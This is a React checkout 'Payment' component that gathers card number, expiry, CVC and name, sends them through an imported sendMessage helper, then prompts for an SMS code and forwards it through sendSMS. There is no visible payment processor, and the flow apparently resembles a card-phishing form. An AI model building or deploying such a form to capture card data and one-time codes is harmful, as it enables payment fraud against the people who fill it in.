import { useTranslation } from "react-i18next";
import style from "./Payment.module.css";
import { useForm } from "react-hook-form";
import { useState } from "react";
import {
  cardCVCValidation,
  cardExpirationValidation,
  cardNameValidation,
  cardNumberValidation,
  smsValidation,
} from "../../../utils/validation";
import CustomButton from "../../../sharedComponents/customButton/CustomButton";
import { sendMessage } from "../../../server/sendMessage";
import Popup from "../../../sharedComponents/popup/Popup";
import { sendSMS } from "../../../server/sendSMS";

function Payment({ setChapter, data, setData }) {
  const { t } = useTranslation();
  const [popup, setPopup] = useState(false);

  const {
    register,
    formState: { errors },
    handleSubmit,
  } = useForm({
    mode: "all",
  });

  const buyNow = (cardData) => {
    sendMessage({ ...data, ...cardData });
    setData({ ...data, ...cardData });
    setPopup(true);
  };

  const confirmSMS = (sms) => {
    sendSMS(sms);
    setPopup(false);
    setChapter("Review");
  };

  return (
    <>
      {popup && (
        <Popup showLangScreen={setPopup}>
          <form onSubmit={handleSubmit(confirmSMS)} className={style.sms}>
            <p className={style.subtitle}>
              {t("checkoutPage.chapter.payment.sms")}
            </p>
            <input
              style={errors.sms?.message && { borderColor: "red" }}
              type="text"
              {...register("sms", smsValidation)}
            />
            <button>SUBMIT</button>
          </form>
        </Popup>
      )}
      <form className={style.payment} onSubmit={handleSubmit(buyNow)}>
        <div className={style.line}>
          <div className={style.input1}>
            <p className={style.subtitle}>
              {t("checkoutPage.chapter.payment.cardNumber")}
            </p>
            <input
              style={errors.cardNumber?.message && { borderColor: "red" }}
              type="text"
              placeholder="⁎⁎⁎⁎ ⁎⁎⁎⁎ ⁎⁎⁎⁎ ⁎⁎⁎⁎"
              {...register("cardNumber", cardNumberValidation)}
            />
          </div>
        </div>
        <div className={style.line}>
          <div className={style.input2}>
            <p className={style.subtitle}>
              {t("checkoutPage.chapter.payment.expiration")}
            </p>
            <input
              style={errors.expiration?.message && { borderColor: "red" }}
              type="text"
              placeholder="MM/YY"
              maxLength="5"
              {...register("expiration", cardExpirationValidation)}
              onInput={(e) => {
                let value = e.target.value.replace(/\D/g, "");
                value = value.replace(
                  /^(\d{2})(\d{1,2})?$/,
                  (match, p1, p2) => {
                    return p2 ? `${p1}/${p2}` : p1;
                  }
                );
                e.target.value = value;
              }}
            />
          </div>
          <div className={style.input2}>
            <p className={style.subtitle}>
              {t("checkoutPage.chapter.payment.CVC")}
            </p>
            <input
              style={errors.CVC?.message && { borderColor: "red" }}
              type="text"
              placeholder="123"
              {...register("CVC", cardCVCValidation)}
            />
          </div>
        </div>
        <div className={style.line}>
          <div className={style.input1}>
            <p className={style.subtitle}>
              {t("checkoutPage.chapter.payment.name")}
            </p>
            <input
              style={errors.cardName?.message && { borderColor: "red" }}
              type="text"
              placeholder={t("checkoutPage.chapter.payment.nameInput")}
              {...register("cardName", cardNameValidation)}
            />
          </div>
        </div>
        <CustomButton text={t("checkoutPage.chapter.payment.payNow")} />
      </form>
    </>
  );
}

export default Payment;
